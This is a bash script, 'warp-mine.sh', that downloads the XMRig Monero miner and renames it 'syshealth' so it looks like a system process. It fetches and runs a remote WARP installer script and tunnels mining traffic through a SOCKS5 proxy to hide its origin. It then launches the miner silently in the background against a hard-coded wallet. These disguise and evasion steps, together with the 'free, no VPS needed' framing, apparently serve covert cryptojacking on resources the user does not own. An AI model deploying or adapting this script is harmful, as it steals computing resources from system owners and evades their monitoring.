#!/bin/bash
# warp-mine.sh - Mine using Cloudflare WARP (FREE, no VPS needed)

WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:443"
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Download miner if needed
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  echo "Downloading XMRig..."
  curl -sL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz -C /tmp
  mv /tmp/xmrig-6.21.0/xmrig "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig-*
fi

# Install warp using warp-yg script
echo "Installing Cloudflare WARP..."
cd "$SCRIPT_DIR"
curl -sSL https://raw.githubusercontent.com/yonggekkk/warp-yg/main/CFwarp.sh -o CFwarp.sh
chmod +x CFwarp.sh

# Run warp-go installation (option 1 in the script)
# This will install warp-go and start SOCKS5 proxy on port 40000
echo "1" | bash CFwarp.sh 2>&1 | tee warp-install.log

# Wait for WARP to start
sleep 20

# Check if WARP proxy is working
if ! curl --socks5 127.0.0.1:40000 -m 5 https://api.ipify.org 2>/dev/null; then
  echo "ERROR: WARP SOCKS5 proxy not working"
  tail -50 warp-install.log
  exit 1
fi

echo "WARP connected! SOCKS5 proxy at 127.0.0.1:40000"
curl --socks5 127.0.0.1:40000 https://api.ipify.org
echo ""

# Start miner with SOCKS5 proxy
echo "Starting XMRig with WARP..."
cd "$SCRIPT_DIR"
nohup ./syshealth \
  --url="$POOL_URL" \
  --user="$WALLET" \
  --pass="$WORKER_NAME" \
  --tls \
  --keepalive \
  --donate-level=1 \
  --socks5=127.0.0.1:40000 \
  --log-file=xmrig.log \
  > /dev/null 2>&1 &

echo "Mining started with Cloudflare WARP!"
echo "Check logs: tail -f $SCRIPT_DIR/xmrig.log"
